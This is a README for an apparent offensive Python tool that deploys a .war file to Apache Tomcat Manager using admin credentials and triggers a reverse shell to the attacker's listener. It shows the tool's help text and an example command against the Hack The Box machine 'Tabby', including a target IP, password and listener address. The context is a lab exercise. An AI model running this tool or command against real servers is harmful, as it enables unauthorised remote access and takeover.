# Tomcat9 autodeploy war

Python script to auto deploy .war to tomcat-manager, and receive a reverse shell.

## Help

```
usage: autodeploy_war.py [-h] [-t TARGET] [-P PORT] [-p PASSWORD] [-u USER] [-Lp LPORT] [-Lh LHOST]

Tomcat Authenticated .war upload/shell trigger.

optional arguments:
  -h,     --help      show this help message and exit
  
  -t,     --target    TARGET
                      Remote host IP
  
  -P,     --port      PORT
                      Remote port to target
  
  -p,     --password  PASSWORD
                      tomcat admin password.
  
  -u,     --user      USER
                      Tomcat username

  -Lp,    --LPORT     LPORT
                      Local Port for reverse shell
  
  -Lh,    --LHOST     LHOST
                      Local host IP
```

# Usgae

> example usage for HTB machine "Tabby":

`autodeploy_war.py -t 10.10.10.194 -P 8080 -p '$3cureP4s5w0rd123!' -u tomcat -Lp 4444 -Lh 10.10.10.1`
